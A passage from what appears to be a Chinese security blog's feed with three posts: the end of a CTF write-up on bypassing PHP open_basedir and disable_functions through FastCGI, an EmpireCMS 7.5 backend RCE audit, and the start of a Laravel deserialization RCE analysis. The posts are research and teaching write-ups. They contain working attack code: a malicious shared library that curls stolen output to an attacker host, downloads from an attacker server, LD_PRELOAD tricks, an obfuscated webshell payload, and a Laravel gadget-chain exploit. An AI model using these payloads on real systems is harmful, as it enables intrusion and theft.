$this-&gt;_requests[ $resp[&#39;requestId&#39;] ][&#39;state&#39;] = self::REQ_STATE_OK;                  if ( $resp[&#39;requestId&#39;] == $requestId ) {                      break;                  }              }              if ( microtime( true ) - $startTime &gt;= ( $timeoutMs * 1000 ) ) {                  // Reset                  $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );                  throw new \Exception( &#39;Timed out&#39; );              }          } while ( $resp );    if ( ! is_array( $resp ) ) {              $info = stream_get_meta_data( $this-&gt;_sock );              // We must reset timeout but it must be AFTER we get info              $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );              if ( $info[&#39;timed_out&#39;] ) {                  throw new TimedOutException( &#39;Read timed out&#39; );              }              if ( $info[&#39;unread_bytes&#39;] == 0                   &amp;&amp; $info[&#39;blocked&#39;]                   &amp;&amp; $info[&#39;eof&#39;] ) {                  throw new ForbiddenException( &#39;Not in white list. Check listen.allowed_clients.&#39; );              }              throw new \Exception( &#39;Read failed&#39; );          }          // Reset timeout          $this-&gt;set_ms_timeout( $this-&gt;_readWriteTimeout );          switch ( ord( $resp[&#39;content&#39;]{4} ) ) {        case self::CANT_MPX_CONN:            throw new \Exception( &#39;This app can\&#39;t multiplex [CANT_MPX_CONN]&#39; );            break;        case self::OVERLOADED:            throw new \Exception( &#39;New request rejected; too busy [OVERLOADED]&#39; );            break;        case self::UNKNOWN_ROLE:            throw new \Exception( &#39;Role value not known [UNKNOWN_ROLE]&#39; );            break;        case self::REQUEST_COMPLETE:            return $this-&gt;_requests[ $requestId ][&#39;response&#39;];    }}}$client    = new Client(&quot;unix:///tmp/php-cgi.sock&quot;, -1);  $php_value = &quot;open_basedir = /&quot;;$filepath  = &#39;/tmp/readflag.php&#39;;  $content   = &#39;hpdoger&#39;;echo $client-&gt;request(      array(          &#39;GATEWAY_INTERFACE&#39; =&gt; &#39;FastCGI/1.0&#39;,          &#39;REQUEST_METHOD&#39;    =&gt; &#39;POST&#39;,          &#39;SCRIPT_FILENAME&#39;   =&gt; $filepath,    &#39;SERVER_SOFTWARE&#39;   =&gt; &#39;php/fcgiclient&#39;,    &#39;REMOTE_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,    &#39;REMOTE_PORT&#39;       =&gt; &#39;9985&#39;,    &#39;SERVER_ADDR&#39;       =&gt; &#39;127.0.0.1&#39;,    &#39;SERVER_PORT&#39;       =&gt; &#39;80&#39;,    &#39;SERVER_NAME&#39;       =&gt; &#39;mag-tured&#39;,    &#39;SERVER_PROTOCOL&#39;   =&gt; &#39;HTTP/1.1&#39;,    &#39;CONTENT_TYPE&#39;      =&gt; &#39;application/x-www-form-urlencoded&#39;,    &#39;CONTENT_LENGTH&#39;    =&gt; strlen( $content ),          &#39;PHP_VALUE&#39;         =&gt; $php_value,),$content);</code></pre><h3 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h3><p>回到这个题目，首先我们找到P神有一篇文章<a href="https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html" target="_blank" rel="noopener">PHP绕过open_basedir列目录的研究</a></p><p>上传一个php到/tmp下，包含之后列一下根目录存在哪些文件</p><pre><code>copy(&#39;http://vps/log2.txt&#39;,&#39;/tmp/scandir.php&#39;）*lo2.txt*=&gt;&lt;?php$file_list = array();// normal files$it = new DirectoryIterator(&quot;glob:///*&quot;);foreach($it as $f) {    $file_list[] = $f-&gt;__toString();}// special files (starting with a dot(.))$it = new DirectoryIterator(&quot;glob:///.*&quot;);foreach($it as $f) {    $file_list[] = $f-&gt;__toString();}sort($file_list);foreach($file_list as $f){        echo &quot;{$f}&lt;br/&gt;&quot;;}?&gt;</code></pre><p><img src="http://static.zybuluo.com/1160307775/ws7kk6wcaingfbutddk5mbbg/image_1dkalj2gr1c4434273c1geo1a8e64.png" alt="image_1dkalj2gr1c4434273c1geo1a8e64.png-226.6kB"></p><p>使用同样的copy方法上传我们的FastCGI脚本，脚本中<code>php_value</code>的值是我们的FastCGI要传给FPM的值用来修改php.ini，并且根据<code>SCRIPT_FILENAME</code>对php文件进行执行<code>/tmp/readflag.php</code>。</p><p>同时脚本还要修改的地方，就是使用套接字协议去加载socket。Nginx连接fastcgi的方式有2种：TCP和unix domain socket，脚本使用的即第二种形式。根据不同的php版本，找不同的fastcgi的套接字。在0CTF的题目中，大家用的是php7.2默认的FPM套接字<code>/run/php/php7.3-fpm.sock）</code>，其实FastCGI/FPM套接字都可以用，但是php5的默认</p><p>出题人在tmp目录已经给我们FastCGI的套接字<code>/tmp/php-cgi.sock</code>，直接修改脚本</p><pre><code>new Client(&quot;unix:///tmp/php-cgi.sock&quot;, -1)</code></pre><p>同时我们还要上传一个readflag.php文件作为脚本的<code>SCRIPT_FILENAME</code>，这里我让FPM为我们加载这样一个php脚本，成功读到readflag程序。但此时我们仍需要bypass disable_functions</p><pre><code>&lt;?phpvar_dump(file_get_contents(&#39;/readflag&#39;));</code></pre><p><img src="http://static.zybuluo.com/1160307775/xvn7wtzdhnp9r0ouipcrcdbq/image_1dkaqauqt1pud86t1j5rqei74f7e.png" alt="image_1dkaqauqt1pud86t1j5rqei74f7e.png-406.1kB"></p><h2 id="Disable-functions的绕过"><a href="#Disable-functions的绕过" class="headerlink" title="Disable_functions的绕过"></a>Disable_functions的绕过</h2><h3 id="FastCGI加载so"><a href="#FastCGI加载so" class="headerlink" title="FastCGI加载so"></a>FastCGI加载so</h3><p>看了下Disable_functions留给我们的有putenv()</p><p>关于LD_PRELOAD与putenv也就不过多介绍了，飘零师傅文章写的很详细。大意就是把恶意的so文件加载到环境变量中去执行，而so是我们编译出来的c文件，包含rce的语句，这也是当时0CTF的解题思路。</p><p>不过在这道题中，没有安装Imagick，也没有mail函数。但是还有一个函数也会调用sendmail去开进程-&gt;error_log，后面会复现一下error_log的做法。</p><p>那么既然putenv()+函数是把so文件加载到环境变量中再去调用，那么我们fastcgi也完全可以做同样的事，只需要更改一下上面脚本的      <code>php_value</code>给ini添加一个extender就行了</p><pre><code> $php_value = &quot;allow_url_include = On\nsafe_mode = Off\nopen_basedir = /\nextension_dir = /tmp\nextension = hpdoger.so\n</code></pre><p>编译一个恶意的c文件<code>hpdoger.c</code>，这里直接用网上亘古不变的写法</p><pre><code>#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;__attribute__ ((__constructor__)) void preload (void){    system(&quot;curl vps:6666/`/readflag`&quot;);}</code></pre><p>通过shared命令编译<code>gcc hpdoger.c -fPIC -shared -o hpdoger.so</code>，依然是通过copy命令上传fastcgi.php和hpdoger.so，此时/tmp下应该有这两个文件</p><pre><code>copy(&#39;http://vps/hpdoger.so&#39;,&#39;/tmp/hpdoger.so&#39;)</code></pre><p><img src="http://static.zybuluo.com/1160307775/jov8ot2pbsbpyzpaoft92is2/image_1dkatupe71fhkrvopqi1s0a1v5nm.png" alt="image_1dkatupe71fhkrvopqi1s0a1v5nm.png-272kB"></p><p>直接包含fastcgi就能加载并调用hpdoger.so-&gt;bypass base_opendir-&gt;rce</p><pre><code>find=.*/e%00&amp;replace=include(&#39;/tmp/fastcgi.php&#39;)&amp;id=4184&amp;regex=1`</code></pre><p><img src="http://static.zybuluo.com/1160307775/i53w4nd8brbyxs76jmx8bywu/image_1dkatnc0vgq56a717rh1dff1u7s9.png" alt="image_1dkatnc0vgq56a717rh1dff1u7s9.png-78.4kB"></p><h3 id="LD-PRELOAD加载so"><a href="#LD-PRELOAD加载so" class="headerlink" title="LD_PRELOAD加载so"></a>LD_PRELOAD加载so</h3><p>前文提到mail被Disable_functions了，但是mail和error_log都调用了外部进程sendmail。这里编写一个php来调用error_log，然后代码执行包含这个/tmp下的php即可rce</p><pre><code>&lt;?phpputenv(&quot;LD_PRELOAD=/tmp/hpdoger.so&quot;);error_log(&#39;&#39;,1);?&gt;</code></pre><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>自闭点在于本地环境和远程环境真的是两个概念，mac环境gcc编译和ubuntu的gcc编译出来的东西天壤之别..</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;从一道CTF学习Fastcgi绕过姿势&quot;&gt;&lt;a href=&quot;#从一道CTF学习Fastcgi绕过姿势&quot; class=&quot;headerlink&quot; title=&quot;从一道CTF学习Fastcgi绕过姿势&quot;&gt;&lt;/a&gt;从一道CTF学习Fastcgi绕过姿势&lt;/h1&gt;&lt;p&gt;原文
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://hpdoger.cn/tags/CTF/"/>
    
      <category term="Web" scheme="https://hpdoger.cn/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>帝国(EmpireCMS)7.5的两个后台RCE审计</title>
    <link href="https://hpdoger.cn/2019/09/09/%E5%B8%9D%E5%9B%BD(EmpireCMS)7.5%E7%9A%84%E4%B8%A4%E4%B8%AA%E5%90%8E%E5%8F%B0RCE%E5%AE%A1%E8%AE%A1/"/>
    <id>https://hpdoger.cn/2019/09/09/帝国(EmpireCMS)7.5的两个后台RCE审计/</id>
    <published>2019-09-08T16:00:00.000Z</published>
    <updated>2019-09-11T02:50:37.101Z</updated>
    
    <content type="html"><![CDATA[<h1 id="帝国-EmpireCMS-7-5的两个后台RCE审计"><a href="#帝国-EmpireCMS-7-5的两个后台RCE审计" class="headerlink" title="帝国(EmpireCMS)7.5的两个后台RCE审计"></a>帝国(EmpireCMS)7.5的两个后台RCE审计</h1><p>原文首发于先知：<a href="https://xz.aliyun.com/t/6228" target="_blank" rel="noopener">https://xz.aliyun.com/t/6228</a></p><h2 id="后台RCE-增加自定义页面"><a href="#后台RCE-增加自定义页面" class="headerlink" title="后台RCE-增加自定义页面"></a>后台RCE-增加自定义页面</h2><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>这个漏洞挖掘最初来源于qclover师傅:<a href="http://qclover.cn/2018/10/10/EmpireCMS_V7.5%E7%9A%84%E4%B8%80%E6%AC%A1%E5%AE%A1%E8%AE%A1.html" target="_blank" rel="noopener">EmpireCMS_V7.5的一次审计</a></p><p>但是在这篇复现的文章中还是有一些出入的地方，比如说getshell的具体位置和成因。这里重新跟进分析一下</p><p>首先看一下getshell的流程，这个洞有点像黑盒to白盒<br><img src="http://static.zybuluo.com/1160307775/2r4ccien35hlqw77mo8hrqzj/image_1dje3gco735q1k5m1f11n071a634r.png" alt="image_1dje3gco735q1k5m1f11n071a634r.png-328kB"></p><p>增加页面功能，会在程序根目录生成一个shell.php，访问为phpinfo结果<br><img src="http://static.zybuluo.com/1160307775/2zfoc03cbjv8woa3r5gjme49/image_1djdll0r410dk6ktm7stsgrlm.png" alt="image_1djdll0r410dk6ktm7stsgrlm.png-248.3kB"></p><p>但是在我写入其他木马时，例如<code>&lt;?php @eval($_REQUEST[hpdoger]);?&gt;</code>，根目录却生成了一个空的shell.php文件<br><img src="http://static.zybuluo.com/1160307775/48t49l1j0m30otcu25f646zv/image_1djdlqbum1gj217cp2d61d5f1hi613.png" alt="image_1djdlqbum1gj217cp2d61d5f1hi613.png-56.4kB"></p><p>此时就有些疑问，推测真正的漏洞点应该不是在根目录写入一个php，应该另有它径，这里分析一下漏洞产生的真正成因。</p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>入口在<code>e/admin/ecmscom.php</code>代码48行，跟进函数<code>AddUserpage</code><br><img src="http://static.zybuluo.com/1160307775/zdc2rmjeup4qfnqr5u9agc3j/image_1djdm53uj1m201n781ncr7ednrr1g.png" alt="image_1djdm53uj1m201n781ncr7ednrr1g.png-431.1kB"></p><p>重点关注两个参数的流程:path、pagetext<br><img src="http://static.zybuluo.com/1160307775/w2r7bolvqfafnju4ndirh0al/image_1djdm8m8l6ve645da3es96c51t.png" alt="image_1djdm8m8l6ve645da3es96c51t.png-535.4kB"></p><p>步入<code>RepPhpAspJspcode</code>函数</p><pre><code>function RepPhpAspJspcode($string){    global $public_r;    if(!$public_r[candocode]){        //$string=str_replace(&quot;&lt;?xml&quot;,&quot;[!--ecms.xml--]&quot;,$string);        $string=str_replace(&quot;&lt;\\&quot;,&quot;&amp;lt;\\&quot;,$string);        $string=str_replace(&quot;\\&gt;&quot;,&quot;\\&amp;gt;&quot;,$string);        $string=str_replace(&quot;&lt;?&quot;,&quot;&amp;lt;?&quot;,$string);        $string=str_replace(&quot;&lt;%&quot;,&quot;&amp;lt;%&quot;,$string);        if(@stristr($string,&#39; language&#39;))        {            $string=preg_replace(array(&#39;!&lt;script!i&#39;,&#39;!&lt;/script&gt;!i&#39;),array(&#39;&amp;lt;script&#39;,&#39;&amp;lt;/script&amp;gt;&#39;),$string);        }        //$string=str_replace(&quot;[!--ecms.xml--]&quot;,&quot;&lt;?xml&quot;,$string);    }    return $string;}</code></pre><p>这个函数用来对pagetext参数进行了php标签的实体化，但是empirecms默认<code>public_r[candocode]</code>为null，所以这里相当于直接返回了原始pagetext的值</p><p>继续回到<code>AddUserpage</code>函数，接着步入<code>ReUserpage</code>函数，在e/class/functions.php的4281行<br><img src="http://static.zybuluo.com/1160307775/gyn1d0txofybrwzm1hu39r1a/image_1djdmv7bv17551oir15kv1do5sg42a.png" alt="image_1djdmv7bv17551oir15kv1do5sg42a.png-298.8kB"></p><p>获取程序的根路径后拼接传入的path，而后DoFileMKDir在根目录建立了shell.php</p><p>接着步入<code>InfoNewsBq</code>函数，也是这个漏洞产生的函数。关键代码在<code>e/class/functions.php</code>的2469-2496行</p><p><img src="http://static.zybuluo.com/1160307775/i3ri8ea5z4g4leh18tid1gig/image_1djdnbjo2pelbn91uh11ks21u8p2n.png" alt="image_1djdnbjo2pelbn91uh11ks21u8p2n.png-496.3kB"></p><p>$file参数以php结尾，通过<code>WriteFiletext</code>函数向$file中写入上一步的pagetext(这里为$indextext)，而<code>WriteFiletext</code>是没有任何过滤的</p><pre><code>function WriteFiletext($filepath,$string){    global $public_r;    $string=stripSlashes($string);    $fp=@fopen($filepath,&quot;w&quot;);    @fputs($fp,$string);    @fclose($fp);    if(empty($public_r[filechmod]))    {        @chmod($filepath,0777);    }}</code></pre><p>于是在<code>e/data/tmp</code>目录下，以模版文件的形式写入webshell，同时也将AddCheckViewTempCode()返回的权鉴方法写了进去，所以我们不能直接以url的方式访问这个webshell。<br><img src="http://static.zybuluo.com/1160307775/zp17zrn2j1muego2qa7p9din/image_1djdo4l1d1gte63t1qcb1a73aho4e.png" alt="image_1djdo4l1d1gte63t1qcb1a73aho4e.png-278.6kB"></p><p>但是仍有方法使这个webshell执行并将结果输出。原因在下面这几行<br><img src="http://static.zybuluo.com/1160307775/ecp2rqbzer4w4xk8lw33ghcz/image_1djdnjf5p1b2p1oan4pqn7bd2434.png" alt="image_1djdnjf5p1b2p1oan4pqn7bd2434.png-564.3kB"></p><p>由于入口处定义了常量<code>InEmpireCMS</code>，ob_get_contents可以读取缓冲区的输出，而输出正好是刚才我们包含进去的shell的结果。因此执行了phpinfo()后将要输出到浏览器的内容赋值给了$string变量并返回，在<code>ReUserpage</code>函数中又进行了一次写入，缓冲结果写入的根目录下的shell.php，造成一个表面getshell的现象，其实是一种rce。</p><p><img src="http://static.zybuluo.com/1160307775/ceu2e6w6h3a09qkm8krde4sx/image_1djdnpbbj180fdns1d2h1bvd1neu3h.png" alt="image_1djdnpbbj180fdns1d2h1bvd1neu3h.png-355.3kB"></p><h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>设置<code>$public_r[candocode]</code>为true进行写入内容的过滤</p><h2 id="后台首页模版处rce到getshell"><a href="#后台首页模版处rce到getshell" class="headerlink" title="后台首页模版处rce到getshell"></a>后台首页模版处rce到getshell</h2><p>承接上一个漏洞，整个empirecms不少用到ob_get_contents的地方，所以就想挖掘一下还有没有其他可以利用的点，最后把眼光锁在增加模版处。</p><h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在后台模版功能处，选择管理首页模版，然后点击增加首页方案<br><img src="http://static.zybuluo.com/1160307775/92bdlk6m16ygken7p4xw18dj/image_1djp1p7ed1g6q1vs61qof19pb7cjm.png" alt="image_1djp1p7ed1g6q1vs61qof19pb7cjm.png-226.2kB"></p><p>复制下面的payload，填写到模版内容处，点击提交。</p><pre><code>&lt;?php $aa = base64_decode(ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA);${(system)($aa)};?&gt;</code></pre><p><img src="http://static.zybuluo.com/1160307775/86i5w3sopy8hik249iozojxo/image_1djp1rm8v2kc1s6l1f3b1g59cjk1g.png" alt="image_1djp1rm8v2kc1s6l1f3b1g59cjk1g.png-311.9kB"></p><p>其中base64编码部分为</p><pre><code>ZWNobyAnPD9waHAgZXZhbCgkX1JFUVVFU1RbaHBdKTsnPnNoZWxsLnBocA=&gt;echo &#39;&lt;?php eval($_REQUEST[hp]);&#39;&gt;shell.php</code></pre><p>再点击<strong>启用此方案</strong>即可getshell，在<code>e/admin/template/</code>目录下生成shell.php</p><p><img src="http://static.zybuluo.com/1160307775/jck0izcors9rxr3b8ydk78gf/image_1djp21du0o250ocp31lnuad21t.png" alt="image_1djp21du0o250ocp31lnuad21t.png-64.3kB"><br><img src="http://static.zybuluo.com/1160307775/jeakcfnhj6ljtu09tq4tcsnu/image_1djp23v55qua1pa11b021uir1qmp2a.png" alt="image_1djp23v55qua1pa11b021uir1qmp2a.png-278.2kB"></p><h3 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在e/class/functions.php的<code>NewsBq</code>函数中调用<code>WriteFiletext</code>函数向/e/data/tmp/index.php中写入文件并包含<br><img src="http://static.zybuluo.com/1160307775/vngxtn93avtnyhl4ix12mndr/image_1djp2kjth3i01l78dg91q3g1lba2n.png" alt="image_1djp2kjth3i01l78dg91q3g1lba2n.png-588.3kB"></p><p>查找一下哪些地方调用<code>NewsBq</code>函数，最后锁定在<code>e/admin/template/ListIndexpage.php</code>的<code>DefIndexpage</code>中<br><img src="http://static.zybuluo.com/1160307775/w6dlwq628kgerrrfr67flxfq/image_1djp2t8jo6ej1l7t1ui9t9i734.png" alt="image_1djp2t8jo6ej1l7t1ui9t9i734.png-459.9kB"></p><p>首先从库里获取得到<code>$r[temptext]</code>作为参数传入NewsBq，此时<code>$class</code>为null。那么文件内容可控吗？查看一下入库的语句，看看存不存在任意写入，全局搜索<code>enewsindexpage</code></p><p>在同文件ListIndexpage.php的第23行到47行，调用insert语句向<code>enewsindexpage</code>中增加数据，关键代码如下</p><pre><code>function AddIndexpage($add,$userid,$username){    global $empire,$dbtbpre;    if(!$add[tempname]||!$add[temptext])    {        printerror(&quot;EmptyIndexpageName&quot;,&quot;history.go(-1)&quot;);    }    ...    $add[tempname]=hRepPostStr($add[tempname],1);    $add[temptext]=RepPhpAspJspcode($add[temptext]);    $sql=$empire-&gt;query(&quot;insert into {$dbtbpre}enewsindexpage(tempname,temptext) values(&#39;&quot;.$add[tempname].&quot;&#39;,&#39;&quot;.eaddslashes2($add[temptext]).&quot;&#39;);&quot;);    ...}</code></pre><p>调用AddIndexpage的入口为：</p><pre><code>$enews=$_POST[&#39;enews&#39;];if(empty($enews)){$enews=$_GET[&#39;enews&#39;];}if($enews==&quot;AddIndexpage&quot;){    AddIndexpage($_POST,$logininid,$loginin);}</code></pre><p>所以<code>$add</code>为<code>$_POST</code>获取的数组，经过一次<code>eaddslashes2</code>函数清洗后以temptext字段存入库，而<code>eaddslashes2</code>在内部调用的是addslashes。猜想开发者最初可能只是为了防止sql注入，而没有进行其他类型过滤。但是我们执行任意命令是可以绕过addslashes的限制，取出来temptext字段来rce。</p><p>只需要用到复杂变量：<a href="https://www.jianshu.com/p/7c818ddc5731" target="_blank" rel="noopener">PHP复杂变量绕过addslashes()直接拿shell</a></p><p>整理思路：入库rce语句-&gt;取出库-&gt;写文件-&gt;包含rce-&gt;getshell</p><h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>对入库语句进行过滤，建议在<code>eaddslashes2</code>中增加一些过滤机制</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;帝国-EmpireCMS-7-5的两个后台RCE审计&quot;&gt;&lt;a href=&quot;#帝国-EmpireCMS-7-5的两个后台RCE审计&quot; class=&quot;headerlink&quot; title=&quot;帝国(EmpireCMS)7.5的两个后台RCE审计&quot;&gt;&lt;/a&gt;帝国(Empir
      
    
    </summary>
    
    
      <category term="代码审计" scheme="https://hpdoger.cn/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>Laravel由destrcuct引起的两处反序列化RCE分析</title>
    <link href="https://hpdoger.cn/2019/08/25/Laravel%E7%94%B1destrcuct%E5%BC%95%E8%B5%B7%E7%9A%84%E4%B8%A4%E5%A4%84%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96RCE%E5%88%86%E6%9E%90/"/>
    <id>https://hpdoger.cn/2019/08/25/Laravel由destrcuct引起的两处反序列化RCE分析/</id>
    <published>2019-08-24T16:00:00.000Z</published>
    <updated>2019-08-27T09:19:16.004Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Laravel由destrcuct引起的两处反序列化RCE分析"><a href="#Laravel由destrcuct引起的两处反序列化RCE分析" class="headerlink" title="Laravel由destrcuct引起的两处反序列化RCE分析"></a>Laravel由destrcuct引起的两处反序列化RCE分析</h1><p>文章首发于安全客:<a href="https://www.anquanke.com/post/id/184541" target="_blank" rel="noopener">https://www.anquanke.com/post/id/184541</a></p><p>laravel本身没有反序列化的调用机制，只有依赖于二次开发或者敏感函数才能触发反序列化。在Laravel5.3以后的版本引入<code>Illuminate\Broadcasting\PendingBroadcast.php</code>文件，存在__destrcut魔法函数引发一系列问题。这里我对框架本身能造成rce的点进行分析，一处是三方组件fzaninotto的回调调用<code>call_user_func_array</code>造成的rce，另一处是<br>p神在lumenserial找到laravel核心库的一处任意函数调用。</p><h1 id="Laravel自加载组件fzaninotto组件RCE"><a href="#Laravel自加载组件fzaninotto组件RCE" class="headerlink" title="Laravel自加载组件fzaninotto组件RCE"></a>Laravel自加载组件fzaninotto组件RCE</h1><h2 id="版本说明"><a href="#版本说明" class="headerlink" title="版本说明"></a>版本说明</h2><p><code>fzaninotto</code>在laravel 5.1以后composer默认安装<br><img src="http://static.zybuluo.com/1160307775/fc1ugl8qu5rkggox43xanknq/image_1dhoajden1lhl1rrdc1i18qr82s9.png" alt="image_1dhoajden1lhl1rrdc1i18qr82s9.png-164.8kB"></p><p><code>autoload_classmap.php</code>可以看到，在进行依赖加载的时候默认将<code>/fzaninotto/faker/src/Faker/Generator.php</code>注册到全局变量<code>$classmap</code>中，在程序调用相关类时遵从PSR4的规范，也就是说我们反序列化是可以调用<code>/fzaninotto/faker/src/Faker/</code>目录下的任何文件。</p><p><img src="http://static.zybuluo.com/1160307775/zrpwx3p0q227if3wqkeaucgd/image_1dhoalu3vkne6bp7mf1nfj7qhm.png" alt="image_1dhoalu3vkne6bp7mf1nfj7qhm.png-751.3kB"></p><h2 id="适用条件"><a href="#适用条件" class="headerlink" title="适用条件"></a>适用条件</h2><ul><li>laravel 5.3-5.8</li><li>寻找可控的反序列化点，才能触发该漏洞</li></ul><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>本地搭建laravel最新的环境 5.8.29<br><img src="http://static.zybuluo.com/1160307775/n45b5dlbpcdyukkok7h2sezo/image_1dhobbpoc1j5p1toc1rf71rd729l9.png" alt="image_1dhobbpoc1j5p1toc1rf71rd729l9.png-332kB"></p><p>构造一个反序列化可控点，在<code>app/Http/Controllers</code>文件夹下创建文件TaskController.php，源码如下:</p><pre><code>&lt;?phpnamespace App\Http\Controllers;class TaskController{    public function index(){        unserialize($_GET[&#39;url&#39;]);    }}</code></pre><p>在<code>routes/web.php</code>文件中添加这样路由记录</p><pre><code>Route::get(&#39;/bug&#39;, &#39;TaskController@index&#39;);</code></pre><p><img src="http://static.zybuluo.com/1160307775/9txqyfac02ns2bq2tp9n9s8c/image_1dhoc20tt1p37lmb30g19m1s1v13.png" alt="image_1dhoc20tt1p37lmb30g19m1s1v13.png-234.4kB"></p><h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><pre><code>&lt;?php//exp.phpnamespace Faker{    class Generator{        protected $formatters = array();        public function __construct($formatters)        {            $this-&gt;formatters = $formatters;        }    }}namespace Illuminate\Broadcasting{    class PendingBroadcast.php``    {        protected $events;        protected $event;        public function __construct($events, $event)        {            $this-&gt;events = $events;            $this-&gt;event = $event;        }    }}namespace{    $generator = new Faker\Generator(array(&quot;dispatch&quot;=&gt;&quot;system&quot;));    $PendingBroadcast = new Illuminate\Broadcasting\PendingBroadcast($generator,&quot;id&quot;);    echo urlencode(serialize($PendingBroadcast));}</code></pre><p>运行exp.php生成poc，如果环境搭建没有问题，直接请求下面的uri既能看到rce效果</p><pre><code>bug?url=O%3A40%3A&quot;Illuminate%5CBroadcasting%5CPendingBroadcast&quot;%3A2%3A%7Bs%3A9%3A&quot;%00%2A%00events&quot;%3BO%3A15%3A&quot;Faker%5CGenerator&quot;%3A1%3A%7Bs%3A13%3A&quot;%00%2A%00formatters&quot;%3Ba%3A1%3A%7Bs%3A8%3A&quot;dispatch&quot;%3Bs%3A6%3A&quot;system&quot;%3B%7D%7Ds%3A8%3A&quot;%00%2A%00event&quot;%3Bs%3A2%3A&quot;id&quot;%3B%7D</code></pre><p><img src="http://static.zybuluo.com/1160307775/ci645ofexwzuhhscrh6ix4bj/image_1dhocrcl7t951nqna0abdu19l71t.png" alt="image_1dhocrcl7t951nqna0abdu19l71t.png-97.7kB"></p><h3 id="EXP流程"><a href="#EXP流程" class="headerlink" title="EXP流程"></a>EXP流程</h3><p>在入口设置断点，传入payload<br><img src="http://static.zybuluo.com/1160307775/endgg8ppidelbmgxxi0uj1po/image_1dhod29lhevt1urr1u8j8v1pf32a.png" alt="image_1dhod29lhevt1urr1u8j8v1pf32a.png-239.1kB"></p><p>步入<code>Illuminate\Foundation\AliasLoader</code>的load函数，检测要实例的对象是否是laravel注册门面类，这里不满足条件<br><img src="http://static.zybuluo.com/1160307775/nipw8jf21ejjop49p2qvv1ss/image_1dhod50m81hlejqdltvv31ldd2n.png" alt="image_1dhod50m81hlejqdltvv31ldd2n.png-189.3kB"></p><p>因此步入<code>Composer\Autoload\ClassLoader</code>查找相应class对应于vendor中的php文件。也就是上文提到的laravel在加载服务容器时会执行的<code>autoload_class</code>作用结果</p><p><img src="http://static.zybuluo.com/1160307775/gnp5zqdryec1r1xm0swduzss/image_1dhoh4r22a9ln89upkgff5o53h.png" alt="image_1dhoh4r22a9ln89upkgff5o53h.png-531.1kB"></p><p>看到调用栈能够成功读取到<code>Faker\Generato</code>文件，并返回给includefile()</p><p>载入文件后步入到了反序列化的入口__destruct函数<br><img src="http://static.zybuluo.com/1160307775/xer6dqy2miqhm9n65n4f6ryi/image_1dhohl8c1b005lhch91ier1sij4o.png" alt="image_1dhohl8c1b005lhch91ier1sij4o.png-261.2kB"></p><p>步入执行dispatch函数，跳转到<code>vendor/fzaninotto/faker/src/Faker/Generator.php</code>的call方法<br><img src="http://static.zybuluo.com/1160307775/7mscxmikz6sh3m5vm6n71aga/image_1dhohf6ii1qp5uk41vb81emh1tvi3u.png" alt="image_1dhohf6ii1qp5uk41vb81emh1tvi3u.png-347.9kB"></p><p>跟进format函数如下图，发现此时的$arguments为可控值即我们序列化传入的$this-&gt;event<br><img src="http://static.zybuluo.com/1160307775/b913247o6m4bapk67pg329k8/image_1dhohhel0113lp9j14iq1o7g1deg4b.png" alt="image_1dhohhel0113lp9j14iq1o7g1deg4b.png-436.8kB"></p><p>继续步入看看getFormatter函数的具体实现</p><pre><code>public function getFormatter($formatter) # formatter  = dispatch{    if (isset($this-&gt;formatters[$formatter])) { # formatters可控        return $this-&gt;formatters[$formatter];    }    foreach ($this-&gt;providers as $provider) {        if (method_exists($provider, $formatter)) {            $this-&gt;formatters[$formatter] = array($provider, $formatter);            return $this-&gt;formatters[$formatter];        }    }    throw new \InvalidArgumentException(sprintf(&#39;Unknown formatter &quot;%s&quot;&#39;, $formatter));}</code></pre><p>判断formatters[formatter]存在即返回，然而formatters也是我们可控的，那就能返回任意函数名了。即call_user_func_arrary的函数名和函数值都可控，rce实现～<br><img src="http://static.zybuluo.com/1160307775/n5f8fm6zdtweygg047xhitdb/image_1dhoj1sdkbh3110j1vmq123efuf65.png" alt="image_1dhoj1sdkbh3110j1vmq123efuf65.png-95.9kB"></p><h1 id="Dispatcher处存在任意函数调用"><a href="#Dispatcher处存在任意函数调用" class="headerlink" title="Dispatcher处存在任意函数调用"></a>Dispatcher处存在任意函数调用</h1><p>首先还是看一下造成漏洞的点在<code>vendor/laravel/framework/src/Illuminate/Bus/Dispatcher.php</code>，允许我们使用<code>call_user_func</code>进行任意函数调用，且参数可控。<br><img src="http://static.zybuluo.com/1160307775/ceenl8t6uw3aipnvsc9x93p8/image_1dhnv8s401hhqdai12u51uqgia1p.png" 